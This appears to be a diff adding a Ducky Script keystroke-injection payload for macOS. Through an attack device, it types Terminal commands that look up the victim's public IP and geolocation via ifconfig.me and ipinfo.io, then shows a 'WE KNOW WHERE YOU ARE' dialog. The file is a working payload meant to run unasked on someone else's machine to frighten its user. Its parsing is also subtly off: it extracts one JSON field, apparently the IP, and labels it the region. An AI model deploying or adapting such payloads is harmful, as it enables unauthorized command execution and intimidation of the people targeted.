@@ -1,0 +1,38 @@
+
+REM Title: MACGEOLOCATE
+REM Author: Ecto-1A
+REM Description: Uses machines public IP to do a geolocate lookup and 
+REM displays the results in a pop up window
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: 
+
+REM Retrieve the public IP address of the user and save to variable
+DELAY 200
+GUI SPACE
+DELAY 200
+STRING terminal
+DELAY 200
+ENTER
+DELAY 200
+STRING ip=$(curl ifconfig.me)
+DELAY 200
+ENTER
+DELAY 1000
+
+REM Send a request to ipinfo.io using the IP address and parse the response
+STRING response=$(curl ipinfo.io/$ip)
+DELAY 200
+ENTER
+DELAY 1000
+
+REM Extract the city, region, and country from the response
+STRING region=$(echo $response | awk -F'"' '{print $4}')
+DELAY 200
+ENTER
+DELAY 200
+
+STRING osascript -e 'display dialog "WE KNOW WHERE YOU ARE\n\nRegion: '"$region"'"'
+DELAY 200
+ENTER
+GUI M
